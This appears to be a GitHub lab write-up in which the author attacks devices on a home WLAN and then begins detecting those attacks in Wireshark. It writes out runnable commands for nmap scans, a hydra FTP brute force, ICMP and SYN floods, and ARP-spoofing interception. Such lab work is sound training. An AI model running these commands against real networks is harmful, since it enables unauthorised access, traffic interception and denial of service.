**DISCLAIMER:** This project is for ***educational purposes only***. All attacks were performed in a controlled lab environment on devices I own. Never use these techniques on unauthorized networks or systems.
<br><br><br>

**Lab Setup:**
<br><br>
Attack OS: Parrot Security 6.4

Target WLAN: 192.168.1.0/24

Attacker IP: 192.168.1.16

Gateway IP: 192.168.1.1

Tools Used: Nmap, Hydra, Ping, Hping3, Arpspoof, TCPDump, Wireshark
<br><br><br>

**Traffic Capture:**
<br><br>
Using TCPDump on the attack host to capture all traffic on my WLAN interface.

*tcpdump -i wlp0s20f3*

![image](https://github.com/user-attachments/assets/4be930a3-8b82-422f-8da5-b41fe11b4b53)
<br><br><br>

**Attacks:**
<br><br>

Here begins the fun part. First I will begin with **ping sweep** using nmap to find active hosts in the subnet.

*nmap -sn 192.168.1.0/24*

![image](https://github.com/user-attachments/assets/d3f2c3de-52e1-4f4f-9447-5c03f547b072)

Now a *TCP syn scan* and *UDP scan* respectively with OS detection on the identified hosts with nmap.

*nmap -sS -O 192.168.1.17*
 
![image](https://github.com/user-attachments/assets/e725e899-692a-465f-98a0-9fd0b5edfd77)

*nmap -sU -O 192.168.1.3*
 
![image](https://github.com/user-attachments/assets/54012349-b8c7-4a3c-9184-d894d3a39f20)
<br><br><br>
Now lets move to *brute force* attack. Using hydra to attack open ftp port 2221 in one of the hosts.

*hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.9:2221*

![image](https://github.com/user-attachments/assets/dd7b0a26-0cc4-4653-9201-605c03cf133c)
<br><br>

Time for some DOS. *ICMP Flood* attack using linux's ping utility.

*ping -f 192.168.1.9*

![image](https://github.com/user-attachments/assets/5cc06116-6093-412a-bcae-08af3eb6f5aa)
<br><br>

Another DOS, this time *TCP syn Flood* using hping3.

*hping3 -S --flood -p 2221 192.168.1.9*

![image](https://github.com/user-attachments/assets/dc27073b-3e2b-495c-a8e0-d94c0e7ca660)
<br><br>

The final attack: *Man in the Middle Attack with ARP Spoofing* to intercept traffic between a host and the gateway.

*arpspoof -i wlp0s20f3 -t 192.168.1.9 192.168.1.1*

![image](https://github.com/user-attachments/assets/0d059ee7-09e7-4e7a-9f81-d83469ca2042)

*arpspoof -i wlp0s20f3 -t 192.168.1.1 192.168.1.9*

![image](https://github.com/user-attachments/assets/f75e9d47-39d5-42dc-b2bd-16edf78ea902)
<br><br><br>

**Analysing Captured Traffic with Wireshark:**
<br><br>

Opening the .pcapng file in Wireshark.

![image](https://github.com/user-attachments/assets/0092e8a9-e2ce-448d-b08b-f336d12f6d46)
<br><br>
Statistics > Capture file properties:

![image](https://github.com/user-attachments/assets/c14c337d-2f5e-4a44-a733-5d099bda5419)
<br><br>
Statistics > Endpoints:

![image](https://github.com/user-attachments/assets/3e505fb3-bab0-489f-a360-d5419f5233c2)
<br><br>
Statistics > Conversations:

![image](https://github.com/user-attachments/assets/092ba8fb-7ebe-412d-b4a0-2f5b6e6a1999)
<br><br>

Now we will use wireshark filters to detect the attacks conducted.
<br><br>

To detect ping sweep, using filter *arp* as nmap by default uses ARP requests on a LAN for ping scan.

![image](https://github.com/user-attachments/assets/b9290113-14fc-4207-8fb7-b98627f59a6a)

ARP broadcast in the subnet asking for every host's MAC address confirms ping sweep.














